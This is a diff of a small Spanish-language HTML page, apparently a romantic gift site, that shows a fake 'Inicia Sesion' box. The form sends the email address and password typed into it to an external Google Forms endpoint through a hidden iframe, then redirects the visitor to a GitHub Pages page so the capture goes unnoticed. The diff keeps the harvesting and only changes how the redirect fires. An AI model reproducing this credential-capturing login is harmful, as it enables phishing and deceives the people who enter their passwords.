@@ -3,25 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Para el amor de mi vida...</title>
+    <title>Para el amor de mi vida</title>
     <style>
-        body {
-            background-color: #C2858C;
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .cajita-login {
-            background-color: white;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            width: 320px;
-            text-align: center;
-        }
+        body { background-color: #C2858C; font-family: 'Arial', sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .cajita-login { background-color: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 320px; text-align: center; }
         h1 { color: #333; font-size: 24px; margin-bottom: 5px; }
         p { color: #666; font-size: 14px; margin-bottom: 25px; }
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; background-color: #f9f9f9; }
@@ -29,14 +14,10 @@
         button:hover { background-color: #a06b71; }
         .nota-seguridad { font-size: 11px; color: #888; margin-top: 20px; }
     </style>
-
-    <script type="text/javascript">var submitted=false;</script>
 </head>
 <body>
 
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
-        onload="if(submitted) {window.location='https://yasukejs.github.io/PARA_CYNTHIA/contenido.html';}">
-    </iframe>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
     <div class="cajita-login">
         <h1>Inicia Sesion</h1>
@@ -45,7 +26,7 @@
         <form action="https://docs.google.com/forms/d/e/1FAIpQLSdpYCQhSwZYnBbolikOTIG707rYSIFnkvHIHR5x3tNEl_sJWw/formResponse" 
               method="POST" 
               target="hidden_iframe" 
-              onsubmit="submitted=true;">
+              onsubmit="setTimeout(function(){ window.location.href='https://yasukejs.github.io/PARA_CYNTHIA/contenido.html'; }, 500); return true;">
             
             <input type="email" name="entry.796612169" placeholder="Correo electrónico" required>
             <input type="password" name="entry.114206323" placeholder="Contraseña" required>
@@ -60,4 +41,3 @@
 
 </body>
 </html>
-
